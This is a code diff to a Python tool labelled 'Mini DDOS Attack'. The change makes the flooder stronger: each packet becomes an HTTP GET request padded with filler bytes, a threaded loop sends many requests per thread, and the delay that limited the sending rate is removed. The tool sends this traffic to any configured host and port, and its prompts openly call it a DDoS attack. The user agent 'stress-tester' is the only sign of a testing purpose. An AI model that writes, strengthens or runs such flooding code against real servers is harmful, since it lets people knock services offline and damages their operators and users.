@@ -10,12 +10,21 @@ def send_packet():
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(2)
         sock.connect((config.TARGET_HOST, config.TARGET_PORT))
-        payload = b'A' * config.PAYLOAD_SIZE
+        payload = (
+                    "GET / HTTP/1.1\r\n"
+                    f"Host: {config.TARGET_HOST}\r\n"
+                    "User-Agent: stress-tester/1.0\r\n"
+                    "Connection: close\r\n\r\n"
+                ).encode() + b'A' * config.PAYLOAD_SIZE
         sock.sendall(payload)
         sock.close()
     except Exception as e:
         response_time = str(e)
         return response_time
+
+def send_packets_threaded():
+    for _ in range(config.REQUEST_RATE):
+        send_packet()
 
 def mini_ddos():
     print_feature_header("Mini DDOS Attack")
@@ -33,31 +42,32 @@ def mini_ddos():
     except ValueError:
         print("[Error] Please enter a valid number.")
         return
-    
-    print("\n⚠️  **WARNING** ⚠️  High thread count may cause CPU overlaod!")
-    print(f"[Info] You are about to start a DDOS attack with {config.PAYLOAD_SIZE} bytes of payload.")
-    print(f"[Info] Targeting {config.TARGET_HOST}:{config.TARGET_PORT} with {num_threads} threads.")
-    print(f"[Info] Request rate is set to {config.REQUEST_RATE} requests per second.")
-    print(f"[Info] the total number of packets sent will be {num_threads * config.REQUEST_RATE} packets.")
-    s = input("Enter \"quit\" to exit, Press Enter to continue...")
+
+    total_packets = num_threads * config.REQUEST_RATE
+    print("\n⚠️  **WARNING** ⚠️  High thread count may cause CPU overload!")
+    print(f"[Info] You are about to send {config.PAYLOAD_SIZE} bytes per request.")
+    print(f"[Info] Target: {config.TARGET_HOST}:{config.TARGET_PORT}")
+    print(f"[Info] Threads: {num_threads}, Requests per thread: {config.REQUEST_RATE}")
+    print(f"[Info] Total packets to be sent: {total_packets}")
+    s = input("Enter \"quit\" to exit, Press Enter to continue... ")
     if s.lower() == "quit":
         print("[Info] Exiting Mini DDOS Attack.")
         return
-    
+
     print("\n[Info] Starting Mini DDOS Attack...")
     threads = []
     start_time = time.time()
     for _ in range(num_threads):
-        thread = threading.Thread(target=send_packet)
+        thread = threading.Thread(target=send_packets_threaded)
         threads.append(thread)
         thread.start()
-        time.sleep(1 / config.REQUEST_RATE)
-    
+
     for thread in threads:
         thread.join()
-    
+
     total_time = time.time() - start_time
     print(f"[Info] Mini DDOS Attack completed in {total_time:.2f} seconds.")
+
 
 def config_menu():
     print("\n0. Modify Max Threads")
